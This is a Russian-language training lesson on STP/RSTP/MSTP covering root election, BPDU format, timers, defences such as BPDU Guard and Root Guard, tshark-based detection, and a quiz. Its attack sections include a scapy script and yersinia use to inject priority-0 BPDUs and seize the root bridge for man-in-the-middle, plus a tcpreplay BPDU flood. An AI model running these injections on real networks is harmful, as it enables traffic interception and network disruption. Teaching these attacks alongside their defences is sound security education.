---
id: network-stp-deep
title: "STP/RSTP/MSTP глубоко: дерево, захват root и защита"
category: network
parent: network-module-l2
difficulty: hard
order: 4
tags: [network, stp, rstp, mstp, bpdu, spanning-tree, l2]
prerequisites: [network-ethernet, network-module-l2]
useful_for:
  - "CTF Network (L2-дампы, BPDU)"
  - "Пентест внутренней сети: перехват через root bridge"
  - "Работа (инженер/SOC): защита от петель и поддельных BPDU"
estimated_minutes: 65
summary: "Как STP/RSTP/MSTP строят дерево без петель, как атакующий становится корневым мостом и перехватывает трафик, и какие защитные механизмы (BPDU guard, root guard, loop guard) это ломают."
---

Коммутаторы второго уровня не имеют TTL: кадр, попавший в петлю, циркулирует бесконечно и за секунды превращает сеть в хаос (broadcast storm). **Spanning Tree Protocol** решает эту проблему, логически отключая избыточные пути. Но тот же механизм — вектор атаки: если заставить коммутаторы поверить, что вы и есть корень дерева, весь трафик пойдёт через вас. Этот урок — практическая часть [`network-module-l2`](network-module-l2).

## Зачем нужен STP: петля как катастрофа

Если между двумя коммутаторами два канала без STP, broadcast-кадр пойдёт по кругу и будет размножаться. За миллисекунды загрузка каналов достигнет 100%, а сеть перестанет работать. STP строит **дерево** — связный граф без циклов, — оставляя резервные пути в блокировке.

```bash
# Признак петли/шторма в дампе: взрыв broadcast
sudo tcpdump -i eth0 -nn -c 2000 'broadcast' | wc -l
# Счётчик broadcasts/sec на Cisco
# show interfaces | include broadcast
```

## Как выбирается корневой мост

Каждый коммутатор имеет **Bridge ID** = priority (2 байта, по умолчанию 32768) + MAC (6 байт). Правила:

1. **Root Bridge** — коммутатор с минимальным Bridge ID. Сначала сравнивается priority, при равенстве — MAC.
2. У каждого коммутатора выбирается **Root Port** — порт с минимальной стоимостью пути к корню.
3. На каждом сегменте выбирается **Designated Port** — ближайший к корню.
4. Остальные порты переходят в **Blocking/Discarding**.

```bash
# Увидеть роль корня (Cisco)
# show spanning-tree
# -> "This bridge is the root" или "Root ID ... Priority 32768"
```

Стоимости путей (802.1D): 10 Мбит/с = 100, 100 Мбит/с = 19, 1 Гбит/с = 4, 10 Гбит/с = 2.

## BPDU: сердце протокола

**BPDU** (Bridge Protocol Data Unit) — кадр с multicast-адресом `01:80:c2:00:00:00`. Поля: Root ID, Bridge ID, Root Path Cost, Port ID, Timer. Отправляется каждые **2 секунды**; если BPDU не приходит `max_age` (20 с), топология перестраивается.

```bash
# Захватить BPDU
sudo tcpdump -i eth0 -nn -e 'ether dst 01:80:c2:00:00:00'
# Подробно в Wireshark: фильтр "stp"
```

## STP, RSTP, MSTP: эволюция

| Протокол | Стандарт | Сходимость | Ключевая идея |
|---|---|---|---|
| STP | 802.1D | 30–50 с | один инстанс, медленные состояния |
| RSTP | 802.1w | < 1 с | роли Alternate/Backup, edge-порты |
| MSTP | 802.1s | < 1 с | несколько инстансов, VLAN→instance mapping |
| PVST+ | Cisco | < 1 с | отдельный STP на каждый VLAN |

RSTP ввёл **edge-порт** (portfast): порт к конечному устройству переходит в forwarding сразу, без ожидания. Если на такой порт случайно прилетит BPDU — это ошибка конфигурации и опасность петли.

## Атака: стать корневым мостом

Атакующий вбрасывает BPDU с **минимальным priority** (например, 0 или 4096) и своим MAC. Коммутаторы пересчитывают дерево и направляют весь трафик через порт атакующего — он становится **man-in-the-middle** на L2.

```bash
# Инструмент: yersinia (интерактивно) или самодельный BPDU через scapy
sudo yersinia -I
# В scapy: отправить BPDU с root priority 0
python3 - <<'PY'
from scapy.all import sendp, Ether, LLC, STP
pkt = Ether(dst="01:80:c2:00:00:00")/LLC()/STP(rootid=0, bridgeid=0, rootpathcost=0, portid=1)
sendp(pkt, iface="eth0", loop=1, inter=2)
PY
```

После захвата корня можно включить IP-форвардинг и слушать трафик. Для детекта — следить за неожиданными изменениями корневого моста (Trap `topology_change`).

## Атака: отправка «плохих» BPDU

Кроме захвата root, атакующий может:

- **BPDU flood** — непрерывно слать BPDU, чтобы держать топологию нестабильной;
- **поддельный root** с огромной стоимостью — «увести» трафик в сторону;
- **инъекция topology change** — заставить коммутаторы чистить MAC-таблицы (частые flood-волны).

```bash
# Генерация потока BPDU (лаборатория)
sudo tcpreplay --intf1=eth0 --loop=1000 bpdu_bad.pcap
```

## Защитные механизмы

| Механизм | Что делает | Против чего |
|---|---|---|
| **BPDU Guard** | выключает (err-disable) порт, если пришёл BPDU | edge-порт не должен получать BPDU |
| **Root Guard** | не даёт порту стать root (root-inconsistent) | захват корневого моста |
| **Loop Guard** | блокирует порт при пропаже BPDU | петли из-за одностороннего линка |
| **BPDU Filter** | не шлёт/не обрабатывает BPDU на edge | шум на портах доступа |
| **PortFast** | мгновенный forwarding для edge | ускорение подключения |

```text
# Cisco: включить BPDU Guard и Root Guard
spanning-tree portfast bpduguard default
interface Gi0/1
 spanning-tree guard root
```

## Практика: разбор STP в дампе

```bash
# 1. Захватить BPDU
sudo tcpdump -i eth0 -nn -w stp.pcap 'ether dst 01:80:c2:00:00:00'
# 2. Разобрать поля
tshark -r stp.pcap -V | grep -A2 "Root Identifier\|Bridge Identifier\|Root Path Cost"
# 3. Найти коммутатор с минимальным root priority
tshark -r stp.pcap -T fields -e stp.root.priority | sort -n | head
```

Ключевые поля для сравнения — **root priority** и **root path cost**. Аномально низкий priority у «конечного» устройства — признак атаки.

## Практика: проверка стабильности дерева

```bash
# Следить за topology change notifications
tshark -r stp.pcap -Y 'stp.flags.tc==1' | head
# Частые TC-кадры => нестабильность/атака
```

Частые **Topology Change** — сигнал, что кто-то постоянно инициирует перестройку дерева.

## Частые ошибки

- **Верить, что STP включён везде** — на edge-портах его часто отключают.
- **Путать root и designated порты** — ошибки в анализе ролей.
- **Игнорировать priority** — при равных priority побеждает MAC, это меняет root.
- **Забывать про RSTP edge** — BPDU на edge ломает всю логику.
- **Считать BPDU «просто мусором»** — это полноценный протокол управления.
- **Не проверять timers** — несовпадение hello/max_age вызывает перестройки.
- **Атаковать без BPDU Guard в лабе** — получите err-disable и потеряете порт.

## Что дальше / решение

После STP переходите к [`network-vlan-qinq`](network-vlan-qinq) (сегментация и double tagging) и [`network-lldp-cdp`](network-lldp-cdp) (разведка топологии). Для защиты на периметре доступа — [`network-layer2-attacks`](network-layer2-attacks) (port security) и [`network-nac-bypass`](network-nac-bypass).

## Таймеры STP и сходимость

Сходимость дерева зависит от таймеров:

| Таймер | Значение по умолчанию | Роль |
|---|---|---|
| Hello | 2 с | период BPDU |
| Max Age | 20 с | сколько ждать BPDU до перестройки |
| Forward Delay | 15 с | время в Listening/Learning |
| Ageing | 300 с | жизнь MAC-записи |

В классическом STP переход в forwarding занимает до 50 секунд (Listening 15 + Learning 15 + слушание). RSTP убирает эти задержки за счёт ролей Alternate/Backup и синхронизации. Несовпадение таймеров между коммутаторами вызывает «дребезг» топологии.

```bash
# Посмотреть таймеры в BPDU
tshark -r stp.pcap -T fields -e stp.hello.time -e stp.max.age -e stp.forward.delay
```

## PVST+ и MSTP на практике

Cisco по умолчанию использует **PVST+** — отдельный экземпляр STP на каждый VLAN. Это позволяет распределять нагрузку: VLAN 10 корень на одном коммутаторе, VLAN 20 — на другом. **MSTP** обобщает идею: несколько VLAN маппятся в один instance, что масштабируется лучше.

```text
# Cisco: настроить MSTP
spanning-tree mode mst
spanning-tree mst configuration
 name REGION
 instance 1 vlan 10-20
 instance 2 vlan 30-40
```

## Диагностика проблем STP

Частые проблемы:

- **Root не там, где ожидали** — кто-то вбросил BPDU с низким priority (атака или ошибка);
- **Постоянные topology change** — flapping-линк или петля;
- **Порт в Blocking не открывается** — несовпадение режимов (STP vs RSTP);
- **err-disable** — сработал BPDU Guard.

```bash
# Cisco: сводка состояния
# show spanning-tree summary
# show spanning-tree detail | include topology change
# Cisco: кто корень
# show spanning-tree root
```

## Мини-лаборатория: воспроизвести петлю

```bash
# Два Linux-бриджа без STP, соединённые двумя кабелями -> шторм
# Включить STP на бридже (если ядро поддерживает)
sudo ip link set br0 type bridge stp_state 1
# Наблюдать BPDU
sudo tcpdump -i br0 -nn 'ether dst 01:80:c2:00:00:00'
```

Без STP и при двух параллельных линках сеть умирает за секунды — это наглядно показывает, зачем протокол нужен и почему его атака так эффективна.

## Квиз

```quiz
- question: "Как выбирается корневой мост STP?"
  options:
    - "По минимальному Bridge ID (priority, затем MAC)"
    - "По максимальной скорости"
    - "По количеству портов"
    - "По IP-адресу"
  answer: 0
  explanation: "Сравнивается priority (по умолчанию 32768), при равенстве — MAC."
- question: "Какой multicast-адрес используется для BPDU?"
  options:
    - "01:80:c2:00:00:00"
    - "ff:ff:ff:ff:ff:ff"
    - "01:00:5e:00:00:01"
    - "33:33:00:00:00:01"
  answer: 0
  explanation: "BPDU шлются на резервированный STP multicast."
- question: "Что делает BPDU Guard?"
  options:
    - "Выключает порт, если на него пришёл BPDU"
    - "Шифрует BPDU"
    - "Ускоряет сходимость"
    - "Назначает корневой мост"
  answer: 0
  explanation: "Edge-порт не должен получать BPDU; при получении — err-disable."
- question: "Как атакующий перехватывает трафик через STP?"
  options:
    - "Вбрасывает BPDU с минимальным priority и становится root"
    - "Отключает DNS"
    - "Меняет MTU"
    - "Подделывает сертификат"
  answer: 0
  explanation: "Став корнем, он получает весь L2-трафик дерева."
- question: "Какой признак в дампе указывает на нестабильность дерева?"
  options:
    - "Частые Topology Change уведомления"
    - "Много HTTPS"
    - "Ровный поток ICMP"
    - "Отсутствие ARP"
  answer: 0
  explanation: "Постоянные TC-кадры означают частую перестройку топологии."
```

## Где пригодится

- **CTF:** задачи с BPDU в дампе, определение корня.
- **Пентест:** перехват трафика на L2 через захват root bridge.
- **SOC:** детект поддельных BPDU и топологических атак.
- **Инженерия:** настройка BPDU Guard/Root Guard, диагностика петель.
